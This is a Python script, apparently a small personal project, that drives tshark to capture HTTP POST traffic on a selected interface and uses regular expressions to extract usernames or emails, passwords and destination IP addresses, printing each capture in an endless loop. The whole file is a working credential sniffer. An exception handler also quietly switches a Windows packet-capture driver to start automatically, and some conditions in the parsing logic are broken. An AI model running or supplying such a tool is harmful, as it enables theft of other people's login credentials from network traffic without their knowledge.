# please read test.py for current status of project

import subprocess, re

def get_data(cmd):
  process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True) #, universal_newlines=True
  for line in iter(process.stdout.readline, b""):
    if "Capturing" in str(line):
      return
    elif line is not b'' or not None or not b' ':
      return clean_data(str(line))
    else:
      return

def clean_data(line):
  #line: input is raw data from tshark cmd
  #parser for extracting data, returns dict
  #format: {site:site-address, user:user-data, pass:pass-data}

  match_str = r"((user)|(email))[A-Za-z]*=[A-Za-z0-9]*&(pass)[A-Za-z]*=[A-Za-z0-9]*"
  ip_addr_str = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

  user_pass = re.search(match_str, line).group()
  ip = re.search(ip_addr_str, line).group()
  user, passw = user_pass.split('&')

  user = ''.join(user.split('=')[1:])
  passw = ''.join(passw.split('=')[1:]) # might have = in pass

  # ((user)|(email))[A-Za-z]*=[A-Za-z0-9]*&(pass)[A-Za-z]*=[A-Za-z0-9]* for user/pass
  # ^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$ for IP address

  return {"site":ip, "user":user, "pass":passw}


def select_interface(tshark_path):
  interface_dict = {}
  counter = 0

  interface_path = tshark_path + " -D any"
  process = subprocess.Popen(interface_path, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

  try:
    for line in iter(process.stdout.readline, b""):
      counter += 1
      address = str(line).split(' ')[1]
      name = re.findall(r"\([A-Za-z\-\s]*\)", str(line))[0]
      interface_dict[counter] = {name:address}
  except:
    import os
    os.system("sc config npf start= auto")

  print("Select Interface:")
  for count, mini_dict in interface_dict.items():
    for name,val in mini_dict.items():
      print(f"{count} {name}")

  int_num = int(input())
  print(f"{interface_dict[int_num]} selected")

  for name in interface_dict[int_num].keys():
    interface = r" -i {} ".format(interface_dict[int_num][name])

  return interface


def sniff():
  print("Using Tshark")

  tshark_path = '"' + input("Enter tshark path: ") + '"' # r"C:\Program Files\Wireshark\tshark.exe"

  interface = select_interface(tshark_path)
  method = r" -Y http.request.method==POST "
  e_data = r" -Tfields -e http.file_data -e ip.dst -a duration:10"
  cmd = tshark_path + interface + method + e_data

  print(cmd) # final query in tshark

  while True:
    print(get_data(cmd))



if __name__ == "__main__":
  sniff()
  print("ended")
